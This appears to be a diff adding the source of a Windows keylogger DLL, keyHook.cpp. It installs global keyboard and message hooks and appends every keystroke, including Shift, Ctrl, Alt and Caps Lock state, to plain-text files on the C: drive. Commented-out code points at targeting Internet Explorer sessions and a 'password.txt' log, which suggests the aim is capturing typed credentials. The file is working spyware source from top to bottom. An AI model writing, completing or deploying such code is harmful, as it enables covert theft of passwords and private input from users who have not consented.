@@ -1,0 +1,257 @@
+// keyHook.cpp : Defines the exported functions for the DLL application.
+//
+
+#include "stdafx.h"
+#include "keyHook.h"
+
+#include <stdio.h> 
+#include <process.h> 
+#include <string>
+
+
+#define CHARNUM 5 
+#define TXTLENGTH 10 
+//#define PLACEOFFILE "password.txt"
+
+static BOOL bHooked = FALSE;
+static BOOL IE_is_active = FALSE;
+static HHOOK hhook = 0, hhookMsg = 0, hhookCBT;
+static int count = 0;
+static char tomb[CHARNUM];
+static FILE *stream;
+static int shift = 32;
+short flag;
+
+extern HINSTANCE hInst;
+enum NUM
+{
+	SHIFT,
+	CONTROL,
+	ALT,
+	CAPITAL
+};
+static int condition[CHARNUM][CAPITAL + 1];
+static char text[TXTLENGTH];
+
+TCHAR saveFile[MAX_PATH] = {0};
+
+LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
+LRESULT CALLBACK CBTProc(int code, WPARAM wParam, LPARAM lParam);
+LRESULT CALLBACK GetMsgProc(
+	int nCode, // hook code
+	WPARAM wParam, // virtual-key code
+	LPARAM lParam // keystroke-message information
+	);
+void Initcondition(void);
+std::string GetProgramRunDir(HMODULE hDllModule);
+
+KEYHOOK_API void SetKbHook(void)
+{
+	
+	if (!bHooked)
+	{
+		//std::string runDir = GetProgramRunDir(hInst);
+		//sprintf_s(saveFile, _T("%s%s"), runDir.c_str(), _T("msg_key_record.txt"));
+		saveFile = _T("C:\\msg_key_record.txt");
+		DebugOutputMsg(_T("saveFilePath = %s."), saveFile);
+		Initcondition();
+		hhook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, hInst, (DWORD)NULL);
+		//hhookCBT = SetWindowsHookEx(WH_CBT, (HOOKPROC)CBTProc, hInst, (DWORD)NULL);
+
+		hhookMsg = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, hInst, (DWORD)NULL);
+		bHooked = TRUE;
+		DebugOutputMsg(_T("SetKbHook, bHooked = %d."), bHooked);
+	}
+}
+
+KEYHOOK_API void RemoveKbHook(void)
+{
+	if (bHooked)
+		UnhookWindowsHookEx(hhook);
+}
+
+LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
+{
+	int i, temp;
+	int flag_shift;
+	int flag_capital;
+	int flag_alt;
+	int flag_control;
+
+	DebugOutputMsg(_T("KeyboardProc, IE_is_active = %d."), IE_is_active);
+
+	//if (IE_is_active)
+	{
+		if ((wParam == VK_SHIFT) || (wParam == VK_CAPITAL) || (wParam == VK_MENU) || (wParam == VK_CONTROL))
+		{
+			flag_shift = 0x8000 & GetKeyState(VK_SHIFT);
+			flag_capital = 0x0001 & GetKeyState(VK_CAPITAL);
+			flag_alt = 0x8000 & GetKeyState(VK_MENU);
+			flag_control = 0x8000 & GetKeyState(VK_CONTROL);
+		}
+		if (wParam != VK_TAB && wParam != VK_ESCAPE && wParam != VK_LEFT && wParam != VK_RIGHT &&
+			wParam != VK_UP && wParam != VK_DOWN && wParam != VK_END && wParam != VK_HOME &&
+			wParam != VK_PRIOR && wParam != VK_NEXT && wParam != VK_INSERT && wParam != VK_NUMLOCK &&
+			wParam != VK_SCROLL && wParam != VK_PAUSE && wParam != VK_LWIN && wParam != VK_RWIN &&
+			wParam != VK_F1 && wParam != VK_F2 && wParam != VK_F3 && wParam != VK_F4 && wParam != VK_F5 &&
+			wParam != VK_F6 && wParam != VK_F7 && wParam != VK_F8 && wParam != VK_F9 &&wParam != VK_F10 &&
+			wParam != VK_F11 && wParam != VK_F12)
+		{
+			if ((0x80000000 & lParam) == 0) //WM_KEYDOWN? 
+			{
+				if (wParam >= 0x41 && wParam <= 0x5a)
+					wParam += 32; //Kisbeture konvertalas 
+				if (wParam == VK_SHIFT || wParam == VK_CONTROL || wParam == VK_MENU || wParam == VK_CAPITAL)
+				{
+					if (wParam == VK_CAPITAL)
+						temp = 1;
+					else temp = 0;
+					condition[count][wParam - 16 - temp] = 1;
+				}
+				tomb[count] = wParam;
+				count++;
+			}
+			else //WM_KEYUP? 
+
+			if (wParam == VK_SHIFT || wParam == VK_CONTROL || wParam == VK_MENU || wParam == VK_CAPITAL)
+			{
+				if (wParam == VK_CAPITAL)
+					temp = 1;
+				else temp = 0;
+				condition[count][wParam - 16 - temp] = 2;
+				tomb[count] = wParam;
+				count++;
+			}
+
+			if (count == CHARNUM)
+			{
+				stream = fopen("C:\\key_record.txt", "a+");
+
+				for (i = 0; i < count; i++)
+				{
+					switch (tomb[i])
+					{
+					case VK_DELETE:
+						fprintf(stream, "%s", "<d>");
+						break;
+
+					case VK_RETURN:
+						fprintf(stream, "%s", "\n");
+						break;
+
+					case VK_BACK:
+						fprintf(stream, "%s", "<b>");
+						break;
+
+					case VK_SHIFT:
+						if (condition[i][SHIFT] == 1)
+							fprintf(stream, "%s", "<sd>");
+						else
+							fprintf(stream, "%s", "<su>");
+						break;
+
+					case VK_CONTROL:
+						if (condition[i][CONTROL] == 1)
+							fprintf(stream, "%s", "<ctd>");
+						else
+							fprintf(stream, "%s", "<ctu>");
+						break;
+
+					case VK_MENU:
+						if (condition[i][ALT] == 1)
+							fprintf(stream, "%s", "<ad>");
+						else
+							fprintf(stream, "%s", "<au>");
+						break;
+
+					case VK_CAPITAL:
+						if (condition[i][CAPITAL] == 1)
+							fprintf(stream, "%s", "<cpd>");
+						else
+							fprintf(stream, "%s", "<cpu>");
+						break;
+
+					default:
+						fprintf(stream, "%c", tomb[i]);
+						break;
+					}
+				}
+				fclose(stream);
+				count = 0;
+				Initcondition();
+			}
+		}
+	}
+	return CallNextHookEx(hhook, code, wParam, lParam);
+}
+
+void Initcondition(void)
+{
+	int i, j;
+	for (i = 0; i < CHARNUM; i++)
+	for (j = 0; j < CAPITAL + 1; j++)
+		condition[i][j] = 0;
+}
+
+LRESULT CALLBACK CBTProc(int code, WPARAM wParam, LPARAM lParam)
+{
+	if (code == HCBT_ACTIVATE)
+	{
+		GetClassName((HWND)wParam, text, TXTLENGTH);
+		if (text[0] == 'I' && text[1] == 'E') //Class name of Internet-Explorer begins with IE 
+			IE_is_active = TRUE;
+		else
+			IE_is_active = FALSE;
+
+		DebugOutputMsg(_T("CBT_ACTIVITE, IE_is_active = %d."), IE_is_active);
+	}
+
+	return CallNextHookEx(hhookCBT, code, wParam, lParam);
+}
+
+LRESULT CALLBACK GetMsgProc(
+	int nCode, // hook code
+	WPARAM wParam, // virtual-key code
+	LPARAM lParam // keystroke-message information
+	)
+{
+	if (nCode == HC_ACTION)
+	{
+		MSG * pMsg = (MSG *)lParam;
+		if (pMsg->message == WM_CHAR)
+		{
+			char ch = (char)pMsg->wParam;
+			char pCh[2] = { 0 };
+			pCh[0] = ch;
+			pCh[1] = '\0';
+
+			FILE * pFile = fopen("C:\\msg_key_record.txt", "a+");
+			DWORD dwError = GetLastError();
+			DebugOutputMsg(_T("savefile=%s,fopen error: %d"), saveFile,dwError);
+			if (pFile)
+			{
+				fwrite(pCh, 1, strlen(pCh), pFile);
+				fclose(pFile);
+			}
+			else
+			{
+				DebugOutputMsg(_T("pFile is null"));
+			}
+			
+		}
+	}
+	return CallNextHookEx(hhookMsg, nCode, wParam, lParam);
+}
+
+
+
+std::string GetProgramRunDir(HMODULE hDllModule)
+{
+	TCHAR exeFullPath[MAX_PATH];
+	std::string strPath = _T("");
+
+	GetModuleFileName(hDllModule, exeFullPath, MAX_PATH);
+	strPath = (std::string)exeFullPath;
+	int pos = strPath.find_last_of('\\', strPath.length());
+	return strPath.substr(0, pos + 1);
+}
